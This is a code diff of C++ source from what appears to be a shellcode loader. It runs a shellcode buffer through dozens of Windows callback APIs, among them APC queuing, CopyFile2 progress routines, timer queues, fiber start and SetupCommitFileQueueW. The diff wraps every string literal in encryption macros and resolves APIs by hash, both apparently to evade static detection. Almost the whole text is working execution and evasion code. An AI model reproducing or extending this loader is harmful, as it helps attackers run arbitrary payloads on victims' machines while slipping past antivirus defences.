@@ -19,6 +19,7 @@
 
 static auto& dynamicInvoker = DynamicInvoker::get_instance();
 
+
 void AlertApc(LPVOID shellcode, SIZE_T shellcodeSize) {
 	DWORD dwOldProtection = NULL;
 	LPVOID lpMem = shellcode;
@@ -83,12 +84,12 @@ void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 		params.pProgressRoutine = (PCOPYFILE2_PROGRESS_ROUTINE)lpMem;
 		params.pvCallbackContext = nullptr;
 
-		DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
-		CopyFile2(L"C:\\Windows\\win.ini", L"C:\\Windows\\Temp\\backup.log", &params);
+		DeleteFileW(ENCRYPT_WSTR("C:\\Windows\\Temp\\backup.log"));
+		CopyFile2(ENCRYPT_WSTR("C:\\Windows\\win.ini"), ENCRYPT_WSTR("C:\\Windows\\Temp\\backup.log"), &params);
 		break;
 	}case CASE_CopyFileEx: {
-		DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
-		CopyFileExW(L"C:\\Windows\\win.ini", L"C:\\Windows\\Temp\\backup.log", (LPPROGRESS_ROUTINE)lpMem, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS);
+		DeleteFileW(ENCRYPT_WSTR("C:\\Windows\\Temp\\backup.log"));
+		CopyFileExW(ENCRYPT_WSTR("C:\\Windows\\win.ini"), ENCRYPT_WSTR("C:\\Windows\\Temp\\backup.log"), (LPPROGRESS_ROUTINE)lpMem, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS);
 		break;
 	}case CASE_CreateThreadPoolWait: {
 		HANDLE hEvent;
@@ -121,11 +122,11 @@ void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 		HANDLE gDoneEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
 		if (CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)lpMem, NULL, 100, 0, 0)) {
 
-			DebugPrintA("Fail");
+			DebugPrintA(ENCRYPT_STR("Fail"));
 		}
 
 		if (WaitForSingleObject(gDoneEvent, INFINITE) != WAIT_OBJECT_0)
-			DebugPrintA("WaitForSingleObject failed (%d)\n", GetLastError());
+			DebugPrintA(ENCRYPT_STR("WaitForSingleObject failed (%d)\n"), GetLastError());
 		break;
 	}case CASE_CryptEnumOIDInfo: {
 		CryptEnumOIDInfo(NULL, NULL, NULL, (PFN_CRYPT_ENUM_OID_INFO)lpMem);
@@ -149,7 +150,7 @@ void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 		SymInitialize((HANDLE)-1, NULL, TRUE);
 
 		WCHAR dummy[522];
-		EnumDirTreeW((HANDLE)-1, L"C:\\Windows", L"*.log", dummy, (PENUMDIRTREE_CALLBACKW)lpMem, NULL);
+		EnumDirTreeW((HANDLE)-1, ENCRYPT_WSTR("C:\\Windows"), ENCRYPT_WSTR("*.log"), dummy, (PENUMDIRTREE_CALLBACKW)lpMem, NULL);
 		break;
 	}case CASE_EnumDisplayMonitors: {
 		EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)lpMem, NULL);
@@ -190,10 +191,10 @@ void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 		EnumPwrSchemes((PWRSCHEMESENUMPROC)lpMem, NULL);
 		break;
 	}case CASE_EnumResourceTypesExW: {
-		EnumResourceTypesExW(GetMoudlebyName(_wcsdup(L"Kernel32.dll")), (ENUMRESTYPEPROCW)lpMem, NULL, RESOURCE_ENUM_VALIDATE, NULL);
+		EnumResourceTypesExW(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("Kernel32.dll"))), (ENUMRESTYPEPROCW)lpMem, NULL, RESOURCE_ENUM_VALIDATE, NULL);
 		break;
 	}case CASE_EnumResourceTypesW: {
-		EnumResourceTypesW(GetMoudlebyName(_wcsdup(L"Kernel32.dll")), (ENUMRESTYPEPROCW)lpMem, NULL);
+		EnumResourceTypesW(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("Kernel32.dll"))), (ENUMRESTYPEPROCW)lpMem, NULL);
 		break;
 	}case CASE_EnumSystemLocales: {
 		EnumSystemLocalesEx((LOCALE_ENUMPROCEX)lpMem, LOCALE_ALL, NULL, NULL);
@@ -218,7 +219,7 @@ void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 		break;
 	}case CASE_FlsAlloc: {
 		DWORD dIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)lpMem);
-		CONST CHAR* dummy = "dummy";
+		CONST CHAR* dummy = ENCRYPT_STR("dummy");
 
 		FlsSetValue(dIndex, &dummy);
 	}case CASE_ImmEnumInputContext: {
@@ -233,7 +234,7 @@ void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 		InitOnceExecuteOnce(&g_InitOnce, (PINIT_ONCE_FN)lpMem, NULL, &lpContext);
 		break;
 	}case CASE_LdrEnumerateLoadedModules: {
-		HMODULE hNtdll = GetMoudlebyName(_wcsdup(L"ntdll.dll"));
+		HMODULE hNtdll = GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll")));
 
 		if (hNtdll) {
 			typedef VOID(NTAPI LDR_ENUM_CALLBACK)(_In_ PLDR_DATA_TABLE_ENTRY ModuleInformation, _In_ PVOID Parameter, _Out_ BOOLEAN* Stop);
@@ -254,7 +255,7 @@ void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 #define LPFIBER_RIP_OFFSET 0x0a8
 		typedef int(WINAPI* tRtlUserFiberStart)();
 
-		HMODULE hNtdll = GetMoudlebyName(_wcsdup(L"ntdll.dll"));
+		HMODULE hNtdll = GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll")));
 		tRtlUserFiberStart lpRtlUserFiberStart = (tRtlUserFiberStart)GetProcAddressbyHASH(hNtdll, RtlUserFiberStart_Hashed);
 
 		_TEB* teb = NtCurrentTeb();
@@ -281,19 +282,19 @@ void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 		break;
 	}case CASE_SetupCommitFileQueueW: {
 		HSPFILEQ hQueue = SetupOpenFileQueue();
-		SetupQueueCopyW(hQueue, L"c:\\", L"\\windows\\sytem32\\", L"kernel32.dll", NULL, NULL, L"c:\\windows\\temp\\", L"kernel32.dll", SP_COPY_NOSKIP);
+		SetupQueueCopyW(hQueue, ENCRYPT_WSTR("c:\\"), ENCRYPT_WSTR("\\windows\\sytem32\\"), ENCRYPT_WSTR("kernel32.dll"), NULL, NULL, ENCRYPT_WSTR("c:\\windows\\temp\\"), ENCRYPT_WSTR("kernel32.dll"), SP_COPY_NOSKIP);
 		SetupCommitFileQueueW(::GetTopWindow(NULL), hQueue, (PSP_FILE_CALLBACK_W)lpMem, NULL);
 		break;
 	}case CASE_SymFindFileInPath: {
 		SymInitialize((HANDLE)(-1), NULL, TRUE);
 
 		SYMSRV_INDEX_INFO finfo;
-		SymSrvGetFileIndexInfo("c:\\windows\\system32\\kernel32.dll", &finfo, NULL);
+		SymSrvGetFileIndexInfo(ENCRYPT_STR("c:\\windows\\system32\\kernel32.dll"), &finfo, NULL);
 
 		char dummy[MAX_PATH];
 
 
-		SymFindFileInPath((HANDLE)(-1), "c:\\windows\\system32", "kernel32.dll", &finfo.timestamp, finfo.size, 0, SSRVOPT_DWORDPTR, dummy, (PFINDFILEINPATHCALLBACK)lpMem, NULL);
+		SymFindFileInPath((HANDLE)(-1), ENCRYPT_STR("c:\\windows\\system32"), ENCRYPT_STR("kernel32.dll"), &finfo.timestamp, finfo.size, 0, SSRVOPT_DWORDPTR, dummy, (PFINDFILEINPATHCALLBACK)lpMem, NULL);
 		break;
 	}case CASE_SysEnumSourceFiles: {
 		SymInitialize((HANDLE)(-1), NULL, TRUE);
